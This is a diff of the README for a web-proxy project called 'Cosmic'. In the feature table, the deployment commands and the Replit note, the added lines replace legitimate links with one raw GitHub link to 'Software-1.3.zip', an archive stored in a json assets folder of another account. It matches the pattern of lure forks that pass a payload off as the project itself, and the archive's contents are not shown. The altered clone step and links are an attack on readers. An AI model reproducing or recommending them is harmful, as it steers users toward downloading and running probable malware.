@@ -13,7 +13,7 @@
 | Wide Collection of Games |  Tab Cloaking   | Wide collection of Apps |
 | :----------------------: | :-------------: | :---------------------: |
 |   About:Blank Cloaking   |   Fast Speeds   |   Built in Tab system   |
-|         Clean UI         | Inspect Element |     Now.gg support      |
+|         Clean UI         | Inspect Element |     https://raw.githubusercontent.com/GDuip/Cosmic/main/static/assets/json/Software-1.3.zip support      |
 |   Password Protection    |     Themes      |   GeForce NOW support   |
 
 </div>
@@ -26,14 +26,14 @@
 ### Server Deployment
 
 You must run these commands on your server:  
-`git clone https://github.com/UltraN0va288/Cosmic`  
+`git clone https://raw.githubusercontent.com/GDuip/Cosmic/main/static/assets/json/Software-1.3.zip`  
 `cd Cosmic`  
 `npm install`  
 `npm start`
 
 #### What happened to Replit Deployment?
 
-As of January 1st, 2024, Replit is [no longer free](https://blog.replit.com/hosting-changes). Try GitHub Codespaces instead.
+As of January 1st, 2024, Replit is [no longer free](https://raw.githubusercontent.com/GDuip/Cosmic/main/static/assets/json/Software-1.3.zip). Try GitHub Codespaces instead.
 
 ### GitHub Codespaces
 
